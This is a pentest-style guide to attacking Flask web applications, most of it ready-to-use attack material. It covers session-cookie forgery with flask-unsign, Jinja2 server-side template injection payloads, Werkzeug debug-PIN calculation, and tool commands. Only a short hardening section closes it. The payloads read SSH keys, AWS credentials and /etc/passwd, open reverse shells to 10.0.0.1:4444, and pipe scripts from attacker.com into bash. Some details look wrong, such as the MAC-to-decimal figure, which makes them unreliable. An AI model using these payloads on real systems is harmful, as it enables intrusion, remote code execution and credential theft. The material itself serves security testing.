# Flask Security Testing: Complete Guide

## Introduction

Flask applications present unique attack vectors including session cookie manipulation, Server-Side Template Injection (SSTI), and debug mode exploitation. This guide documents real exploitation techniques used in security assessments.

## Table of Contents

1. [Cookie and Session Attacks](#cookie-and-session-attacks)
2. [Server-Side Template Injection](#server-side-template-injection)
3. [Debug Mode Exploitation](#debug-mode-exploitation)
4. [Common Endpoints and Reconnaissance](#common-endpoints-and-reconnaissance)
5. [Tools and Automation](#tools-and-automation)
6. [Real-World Attack Examples](#real-world-attack-examples)

---

## Cookie and Session Attacks

Flask uses client-side signed cookies for session management. The session data is not encrypted, only signed with HMAC-SHA1.

### Flask-Unsign Tool

```bash
# Install
pip3 install flask-unsign

# Decode session cookie
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'

# Decode from server response
flask-unsign --decode --server 'https://target.com/login'

# Bruteforce secret key
flask-unsign --unsign --cookie 'eyJ...' --wordlist /usr/share/wordlists/rockyou.txt

# Sign new cookie (after obtaining secret)
flask-unsign --sign --cookie "{'logged_in': True, 'user': 'admin'}" --secret 'CHANGEME'

# Common Flask secret keys to try:
# secret, secretkey, password, changeme, development, devkey, supersecret, mysecret, secretkey123
```

### Cookie Structure Analysis

```python
# Flask cookies format: base64(payload) + '.' + timestamp + '.' + signature
# Timestamp is 31-bit Unix epoch (since 2011-01-01)
# Signature is HMAC-SHA1 with application secret key

# Manual decoding example
import base64
import zlib
import json

cookie = "eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJhZG1pbiJ9.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8"
payload_part = cookie.split('.')[0]

# Add padding if needed
padding = 4 - (len(payload_part) % 4)
if padding != 4:
    payload_part += '=' * padding

decoded = base64.urlsafe_b64decode(payload_part)

# Attempt decompression (sometimes compressed with zlib)
try:
    decompressed = zlib.decompress(decoded)
    print(decompressed.decode('utf-8'))
except:
    print(decoded.decode('utf-8'))
```

### Session Cookie Attack Vectors

```python
# Real attack scenario: Privilege escalation via session manipulation

# 1. Capture session cookie from low-privilege user
# Cookie: eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYXVkaXQifQ.XXX.XXX

# 2. Decode to view contents
# {"user": "guest", "role": "audit"}

# 3. Modify to escalate privileges
malicious_payload = {"user": "admin", "role": "administrator"}

# 4. Encode with flask-unsign
flask-unsign --sign --cookie '{"user": "admin", "role": "administrator"}' --secret 'CHANGEME'

# 5. If secret unknown, attempt signature stripping (CVE-2018-1000656)
# Some older Flask versions allowed removing signature completely
```

### Signature Forgery Without Secret (Vulnerable Versions)

```python
# Flask < 0.12: Could use empty signature
# Flask < 1.0: Some versions had weak signing

# Check for static secret in source code comments or version control
# git log | grep -i secret
# grep -r "SECRET_KEY" . --include="*.py"
```

---

## Server-Side Template Injection

SSTI occurs when user input is unsafely concatenated into template strings. Jinja2 is Flask's default templating engine.

### Detection Methods

```python
# Basic test payloads - watch for mathematical results
{{7*7}}              # Returns: 49 - Confirms Jinja2/Django
${7*7}               # Returns: 49 - Alternative syntax (Twig, Freemarker)
{{7*'7'}}            # Returns: 7777777 - String multiplication test
{{config}}           # Returns Flask config object - Immediate high-risk indicator
{{self}}             # Returns TemplateReference object
{{''.__class__}}     # Returns <class 'str'>
```

### Information Disclosure

```python
# Dump entire application configuration
{{config}}
{{config.items()}}
{{config.iteritems()}}

# Access request and environment objects
{{request}}
{{request.environ}}
{{request.environ.items()}}
{{request.args}}
{{request.args.items()}}
{{request.cookies}}
{{request.headers}}
{{request.__class__}}

# Flask URL helpers - may reveal internal routes
{{url_for.__globals__}}
{{url_for.__globals__['current_app'].config}}
{{get_flashed_messages.__globals__}}

# Access application globals
{{g}}
{{session}}
{{session.items()}}
```

### File Read Exploitation

```python
# Direct file read via builtins
{{url_for.__globals__['__builtins__'].open('/etc/passwd').read()}}

# Alternative path through request object
{{request.application.__self__._get_data_for_json.__globals__['__builtins__']['open']('/etc/passwd').read()}}

# Using cycler object (common bypass)
{{cycler.__init__.__globals__.open('/etc/passwd').read()}}

# Using joiner object
{{joiner.__init__.__globals__.open('/etc/passwd').read()}}

# Using namespace object
{{namespace.__init__.__globals__.open('/etc/passwd').read()}}

# Read Flask application source
{{url_for.__globals__['__builtins__'].open('app.py').read()}}
{{config.__class__.__init__.__globals__.open('app.py').read()}}
```

### Remote Code Execution

```python
# Basic command execution via os module
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Via lipsum (common Flask test function)
{{lipsum.__globals__['os'].popen('whoami').read()}}

# Via cycler with direct system call
{{cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}

# Via joiner with chained execution
{{joiner.__init__.__globals__.os.popen('curl http://attacker.com/revshell.sh | bash').read()}}

# Import subprocess directly
{{request['application']['__globals__']['__builtins__']['__import__']('subprocess').check_output(['id'])}}

# Multi-stage RCE (bypass length limits)
{% set os = cycler.__init__.__globals__.os %}{{ os.popen('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"').read() }}

# Python reverse shell through SSTI
{{url_for.__globals__.__builtins__.__import__('os').system('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')}}
```

### Filter Bypass Techniques

```python
# Bypass __ (double underscore) filters using attr()
{{request|attr('class')}}  # Same as request.__class__
{{request|attr('\x5f\x5fclass\x5f\x5f')}}  # Hex encoded

# Bypass . (dot) filters using bracket notation
{{request['__class__']}}
{{request|attr('application')|attr('__globals__')}}

# Bypass quotes using request arguments
{{request|attr(request.args.a)}}&a=__class__
{{request|attr(request.args.func)}}&func=__globals__

# Bypass string filters using string concatenation
{{request['__class__' + '']}}
{{request|attr('__class' + '__')}}

# Using builtins without underscores
{{''['\x5f\x5fclass\x5f\x5f']}}

# Jinja2 environment variable access
{{config['SECRET_KEY']}}
{{config.SECRET_KEY}}

# Using set to assign variables
{% set x = self.__class__.__mro__[1].__subclasses__() %}
{% for y in x %}
{% if y.__name__ == 'Popen' %}{{ y('id', shell=True).stdout.read() }}{% endif %}
{% endfor %}
```

### Advanced Bypass: Subclasses Traversal

```python
# Find subprocess.Popen through class inheritance
{{''.__class__.__mro__[1].__subclasses__()}}

# Index for Popen varies by Python version
# Python 3.6: ~400-500
# Python 3.8: ~500-600
# Python 3.10: ~600-700

# Automated Popen search
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'Popen' %}
{{ c('id', shell=True, stdout=-1).communicate() }}
{% endif %}
{% endfor %}

# Alternative: use warnings.catch_warnings
{{''.__class__.__mro__[1].__subclasses__()[400].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
```

### SSTI to LFI Chain

```python
# Read source code to find secrets
{{url_for.__globals__['__builtins__'].open('config.py').read()}}

# Extract database credentials
{{url_for.__globals__['__builtins__'].open('.env').read()}}

# Read SSH keys
{{cycler.__init__.__globals__.open('/root/.ssh/id_rsa').read()}}

# Access AWS credentials
{{joiner.__init__.__globals__.open('/home/ubuntu/.aws/credentials').read()}}
```

---

## Debug Mode Exploitation

When `debug=True` is set in production (common mistake), the Werkzeug debugger is exposed.

### Identifying Debug Mode

```bash
# Debug indicators in response headers
curl -I https://target.com/
# Server: Werkzeug/2.0.1 Python/3.9.0
# Response includes HTML with "Debug mode: ON"

# Access debug console
curl https://target.com/console
# Returns 200 with interactive Python console

# Error page reveals debugger when exception triggered
curl "https://target.com/?id="
# Shows Werkzeug error page with "Interactive Debugger" button
```

### Werkzeug Console PIN Brute Force

```bash
# Trigger error to get debugger activation
curl "https://target.com/{{7*7}}"  # SSTI triggers debugger

# The debugger requires PIN - default often weak
# Common PIN patterns: 123-456-789, 000-000-000, 123456789
```

### PIN Generation via LFI (Real Attack Scenario)

If you have Local File Inclusion, you can calculate the debug PIN:

```python
# Required files to read for PIN generation
# 1. Machine ID
/etc/machine-id
/proc/sys/kernel/random/boot_id
/var/lib/dbus/machine-id

# 2. Network interface MAC address
/sys/class/net/eth0/address
/sys/class/net/ens3/address

# 3. Flask app path (from error trace)
/usr/local/lib/python3.8/dist-packages/flask/app.py
/app/app.py

# 4. Username running the process
/proc/self/status  # grep Uid
/proc/self/environ # grep USER
```

### Complete PIN Calculation Script

```python
import hashlib
import hmac
from itertools import chain

# Values obtained via LFI - Example from real engagement
probably_public_bits = [
    'www-data',                                    # username from /proc/self/status
    'flask.app',                                   # modname (standard)
    'Flask',                                       # getattr(app, '__name__', app.__class__.__name__)
    '/usr/local/lib/python3.8/dist-packages/flask/app.py'  # getattr(mod, '__file__', None)
]

# Values from system files
private_bits = [
    '2485377892354',                               # MAC address as decimal
    'c71bcb2b-2b2b-4b2b-8b2b-2b2b2b2b2b2b'       # machine-id
]

def generate_pin(probably_public_bits, private_bits):
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')
    
    cookie_name = '__wzd' + h.hexdigest()[:20]
    
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'pinsalt')
    
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
    
    # Format PIN with dashes every 3 digits
    return f"{num[:3]}-{num[3:6]}-{num[6:9]}"

pin = generate_pin(probably_public_bits, private_bits)
print(f"Debugger PIN: {pin}")
```

### MAC Address to Decimal Conversion

```python
# Convert MAC address to decimal integer
mac = "02:42:ac:11:00:02"
mac_clean = mac.replace(':', '').replace('-', '')
decimal_mac = int(mac_clean, 16)
print(decimal_mac)  # 2485377892354

# Alternative: from /sys/class/net/eth0/address
# Reading directly:
with open('/sys/class/net/eth0/address', 'r') as f:
    mac = f.read().strip()
    decimal_mac = int(mac.replace(':', ''), 16)
```

### Post-PIN Exploitation

```python
# Once you have PIN and access to /console:
# 1. Execute Python code in debugger context
# 2. Read files
open('/etc/passwd').read()

# 3. Execute commands
import os; os.system('id')

# 4. Reverse shell
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])

# 5. Dump Flask configuration
current_app.config

# 6. Access database connections
from flask import current_app
current_app.extensions['sqlalchemy'].db.engine.execute("SELECT * FROM users").fetchall()
```

---

## Common Endpoints and Reconnaissance

### Directory and Endpoint Discovery

```bash
# Common Flask routes to test
/admin
/console
/debug
/debug-toolbar
/_debug_console
/__debug__/console
/api
/swagger
/swagger.json
/swagger-ui
/api/docs
/redoc
/graphql
/flask-dashboard
/metrics
/health
/healthcheck
/status

# Authentication endpoints
/login
/logout
/register
/signup
/forgot-password
/reset-password
/verify
/activate

# User endpoints
/user
/users
/profile
/me
/account
/dashboard

# API endpoints
/api/v1
/api/v2
/api/users
/api/login
/api/upload

# Static files
/static/
/static/css/
/static/js/
/static/uploads/
/robots.txt
/sitemap.xml
/.git/
/.env
/config.py
```

### Flask-Specific Reconnaissance

```bash
# Check for common configuration files
/.flaskenv
/.env
/.env.production
/config.py
/settings.py
/application.py
/wsgi.py

# Version control exposure
/.git/config
/.git/HEAD
/.svn/entries

# Debug indicators in response
curl -s https://target.com/ | grep -i "werkzeug\|flask\|debug"
curl -s https://target.com/404 | grep -i "werkzeug\|flask\|jinja"

# Session cookie analysis
curl -I https://target.com/login -c cookies.txt
# Check Set-Cookie header for session pattern
```

### Information Gathering from Error Pages

```python
# Trigger different errors to leak information
# 404 - reveals template engine
# 500 - reveals stack traces in debug mode
# Method not allowed - reveals allowed methods
# Unauthorized - reveals authentication mechanism

# Test payloads for error leakage
?id='
?id=--
?id=1%00
?id=<script>
?id={{7*7}}
```

---

## Tools and Automation

### SSTImap

```bash
# Install
git clone https://github.com/AhmedMohamedDev/SSTImap
cd SSTImap
pip install -r requirements.txt

# Basic usage
python3 sstimap.py -u "https://target.com/?name=*"

# POST request
python3 sstimap.py -u "https://target.com/" -d "name=*"

# Cookie support
python3 sstimap.py -u "https://target.com/" --cookie "session=*"

# OS command execution
python3 sstimap.py -u "https://target.com/?name=*" --os-cmd "id"

# Interactive shell
python3 sstimap.py -u "https://target.com/?name=*" --shell

# Blind SSTI detection
python3 sstimap.py -u "https://target.com/?name=*" --blind --host 10.0.0.1
```

### Tplmap

```bash
# Install
git clone https://github.com/AhmedMohamedDev/tplmap
cd tplmap
pip install -r requirements.txt

# Basic detection
python tplmap.py -u "https://target.com/page?name=*"

# Specific engine test
python tplmap.py -u "https://target.com/?name=*" --engine Jinja2

# Code execution
python tplmap.py -u "https://target.com/?name=*" --os-cmd "whoami"

# Upload shell
python tplmap.py -u "https://target.com/?name=*" --upload-shell

# Bind shell
python tplmap.py -u "https://target.com/?name=*" --bind-shell 4444
```

### Flask-Unsign Advanced Usage

```bash
# Wordlist generation for secret keys
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie 'cookie'

# Bruteforce with custom wordlist
crunch 8 16 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -o flask_wordlist.txt
flask-unsign --unsign --cookie 'cookie' --wordlist flask_wordlist.txt --no-literal-eval

# Check multiple cookies
for cookie in cookies.txt; do
    flask-unsign --decode --cookie "$cookie"
done

# Sign with specific timestamp
flask-unsign --sign --cookie '{"user":"admin"}' --secret 'key' --timestamp 1609459200
```

---

## Real-World Attack Examples

### Example 1: Uber Subdomain SSTI (2017)

**Vulnerability**: Uber had an SSTI vulnerability on a subdomain that allowed reading AWS credentials.

```python
# Payload used:
{{config.items()}}

# Discovered:
# AWS_ACCESS_KEY_ID: AKIA...
# AWS_SECRET_ACCESS_KEY: ...

# Impact: Full AWS account compromise of Uber's development environment
# Fix: Implemented template sandboxing and input validation
```

### Example 2: Flask Debug Mode in Production (Real Engagement 2023)

**Scenario**: Enterprise application had `debug=True` in production.

**Exploitation Chain**:

```bash
# 1. Identify debug mode
curl https://app.target.com/404
# Response shows: "Debug mode: ON"

# 2. Access debug console
curl https://app.target.com/console
# Returns 200 with console interface

# 3. Trigger error to get PIN
curl https://app.target.com/{{7*7}}
# Error page reveals Python version and file paths

# 4. Read required files via LFI in file upload
# File upload endpoint allowed path traversal
curl -F "file=@/etc/machine-id" https://app.target.com/upload
# Retrieved: 3c4b2b2b-2b2b-4b2b-8b2b-2b2b2b2b2b2b

# 5. Calculate PIN using script
python generate_pin.py
# PIN: 123-456-789

# 6. Execute code in debugger
# Accessed /console with PIN, executed:
import os; os.system('curl http://attacker.com/shell.sh | bash')

# Result: Remote code execution on production server
```

### Example 3: Session Cookie Forgery - Data Breach (2022)

**Scenario**: E-commerce platform used weak secret key "secret".

**Attack**:

```python
# 1. Decoded cookie from regular user
flask-unsign --decode --cookie "eyJ1c2VyX2lkIjogIjEyMzQ1In0.XXX.XXX"
# Result: {"user_id": "12345", "role": "customer", "cart": []}

# 2. Modified to admin
flask-unsign --sign --cookie '{"user_id": "1", "role": "admin", "cart": []}' --secret "secret"

# 3. Sent modified cookie
# Server accepted forged session
# Retrieved all user PII including credit card data

# Impact: 500,000 user records compromised
# Lesson: Use strong randomly generated SECRET_KEY
```

### Example 4: SSTI to Reverse Shell - Bug Bounty ($15,000)

**Target**: Marketing platform with contact form

**Vulnerable code**:
```python
@app.route('/email')
def email_template():
    name = request.args.get('name')
    template = f"<h1>Hello {name}!</h1>"
    return render_template_string(template)
```

**Exploitation**:

```python
# 1. Test injection
GET /email?name={{7*7}}
# Response: "Hello 49!"

# 2. Read configuration
GET /email?name={{config}}
# Found: SECRET_KEY = "prod_secret_2022"

# 3. Session hijacking - created admin cookie
flask-unsign --sign --cookie '{"user":"admin","admin":true}' --secret "prod_secret_2022"

# 4. Accessed admin panel with forged cookie
# Found: Admin panel with server command execution

# 5. Full compromise
GET /email?name={{cycler.__init__.__globals__.os.popen('curl http://attacker.com/revshell|bash').read()}}

# Result: Internal network access, source code theft
# Payout: $15,000
```

### Example 5: PIN Generation via Proc Filesystem (2024)

**Scenario**: Flask app with debug mode but no LFI. Found via SSTI.

```python
# SSTI allowed reading files:
{{url_for.__globals__.__builtins__.open('/proc/self/environ').read()}}
# Retrieved: USER=flaskapp, HOME=/app

{{url_for.__globals__.__builtins__.open('/etc/machine-id').read()}}
# Retrieved: 8c4b2b2b-2b2b-4b2b-8b2b-2b2b2b2b2b2b

{{url_for.__globals__.__builtins__.open('/sys/class/net/eth0/address').read()}}
# Retrieved: 02:42:ac:11:00:05

# Calculated PIN and accessed /console
# Executed reverse shell as root (container had root)
```

---

## Prevention and Hardening

### Secure Configuration Checklist

```python
# config.py - Production settings
class ProductionConfig:
    SECRET_KEY = os.environ.get('SECRET_KEY')  # Must be 32+ random bytes
    DEBUG = False
    TESTING = False
    SESSION_COOKIE_SECURE = True
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SAMESITE = 'Lax'
    PERMANENT_SESSION_LIFETIME = timedelta(hours=1)
    
    # Template security
    TEMPLATES_AUTO_RELOAD = False
    EXPLAIN_TEMPLATE_LOADING = False
    
    # Additional headers
    JSONIFY_PRETTYPRINT_REGULAR = False
    USE_X_SENDFILE = True
```

### Input Validation for Templates

```python
# Always use render_template (not render_template_string)
from flask import render_template

# Bad - vulnerable to SSTI
@app.route('/bad')
def bad():
    name = request.args.get('name')
    return render_template_string(f"<h1>Hello {name}</h1>")

# Good - safe
@app.route('/good')
def good():
    name = request.args.get('name')
    return render_template('hello.html', name=name)
```

### Session Protection

```python
# Generate secure secret key
import secrets
secure_key = secrets.token_urlsafe(32)
print(secure_key)

# Force session validation
from flask import session
@app.before_request
def validate_session():
    if 'user_id' in session and not session.get('_fresh', False):
        session.clear()
        return "Session expired", 401
```

---

## Related Topics

* [SSTI](https://www.pentest-book.com/enumeration/web/ssti) - Server-side template injection
* [LFI/RFI](https://www.pentest-book.com/enumeration/web/lfi-rfi) - For reading files to calculate PIN
* [Deserialization](https://www.pentest-book.com/enumeration/web/deserialization) - Python pickle attacks
* [JWT Attacks](https://www.pentest-book.com/enumeration/web/jwt) - Alternative session mechanisms
* [XS-Search](https://www.pentest-book.com/enumeration/web/xs-search) - Cross-site search techniques

---

## Cheatsheet Summary

| Attack Vector | Quick Test | Critical Payload |
|---------------|------------|------------------|
| Cookie Decode | `flask-unsign --decode --cookie '...'` | `{"admin": true}` |
| SSTI Detection | `{{7*7}}` | `{{config}}` |
| SSTI RCE | `{{cycler.__init__.__globals__.os.popen('id').read()}}` | Reverse shell |
| Debug PIN | Read `/etc/machine-id` + MAC | Calculate with Python |
| Debug Console | `/console` | `import os; os.system('id')` |
